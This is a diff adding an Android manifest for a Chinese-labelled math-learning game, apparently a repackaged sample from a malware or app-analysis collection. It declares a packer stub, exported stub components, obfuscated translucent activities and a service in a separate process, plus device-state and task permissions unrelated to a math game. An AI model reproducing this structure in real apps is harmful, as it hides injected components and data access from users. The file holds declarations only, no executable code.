@@ -1,0 +1,73 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.fdsk.bfle" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <meta-data android:name="unityplayer.ForwardNativeEventsToDalvik" android:value="true"/>
+    <application android:allowBackup="true" android:backupAgent="math.learn.other.MyBackupAgentHelper" android:icon="@drawable/ic_launcher" android:label="数学乐园" android:name="com.stub.StubApp" android:qihoo="activity" android:restoreAnyVersion="true" android:theme="@style/theme_light">
+        <meta-data android:name="com.google.android.gms.games.APP_ID" android:value="@string/app_id"/>
+        <meta-data android:name="com.google.android.gms.version" android:value="@integer/google_play_services_version"/>
+        <meta-data android:name="com.google.android.backup.api_key" android:value="AEdPqrEAAAAIJXBfSi1rghZQnc-KmcCLrroqG6GAVHOJpQIpRg"/>
+        <activity android:label="数学乐园" android:name="math.learn.Main">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </activity>
+        <activity android:excludeFromRecents="true" android:label="数学乐园" android:launchMode="standard" android:name="com.stub.plugin.Stub01" android:noHistory="true" android:taskAffinity="com.fdsk.bfle.affinity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <service android:enabled="true" android:exported="true" android:name="com.stub.plugin.Stub02"/>
+        <receiver android:enabled="true" android:exported="false" android:name="com.stub.plugin.Stub03"/>
+        <provider android:authorities="com.fdsk.bfle.COMMONPROVIDER" android:exported="true" android:name="com.stub.plugin.Stub04"/>
+        <activity android:label="数学乐园" android:name="math.learn.game.Multiplayer" android:screenOrientation="portrait"/>
+        <activity android:label="数学乐园" android:name="math.learn.game.MultiplayerTeamwise" android:screenOrientation="portrait"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.Game"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.GameTraining"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.GameSelection"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.GameMinute"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.GameTime"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.GameSelectionMinute"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.GameSelectionTime"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.GameSelectionNotTime"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.GameByHeart"/>
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="数学乐园" android:name="math.learn.game.RTM"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.GameType" android:windowSoftInputMode="adjustResize|stateHidden"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.GameTypeTraining" android:windowSoftInputMode="adjustResize|stateHidden"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.Tricks"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.Levels"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.ByHeart"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.ByHeartLevels"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.Music"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.Language"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.Numpad"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.Rule"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.MultiplayerSteps"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.MultiplayerStepsTeamwise"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.ByHeartExample"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.Options"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.ColorSelect"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.MyColor"/>
+        <activity android:label="数学乐园" android:name="math.learn.activity.MyGraph"/>
+        <activity android:configChanges="keyboard|keyboardHidden|orientation|screenLayout|screenSize|smallestScreenSize|uiMode" android:label="数学乐园" android:name="com.google.android.gms.ads.AdActivity"/>
+        <receiver android:enabled="true" android:name="math.learn.alarmManager.AlarmReceiverOnStart" android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:enabled="true" android:exported="true" android:name="math.learn.alarmManager.AlarmReceiverNotification"/>
+        <receiver android:enabled="true" android:exported="true" android:name="math.learn.alarmManager.AlarmReceiverDaysStreak"/>
+        <activity android:launchMode="singleInstance" android:name="com.baidu.tjnsb.uxl.rj.ck" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <activity android:launchMode="singleInstance" android:name="com.baidu.tjnsb.uxl.rj.tntk" android:process=":ft" android:theme="@android:style/Theme.Translucent.NoTitleBar"/>
+        <service android:name="com.baidu.tjnsb.uxl.rj.tgc" android:process=":ft"/>
+    </application>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+</manifest>
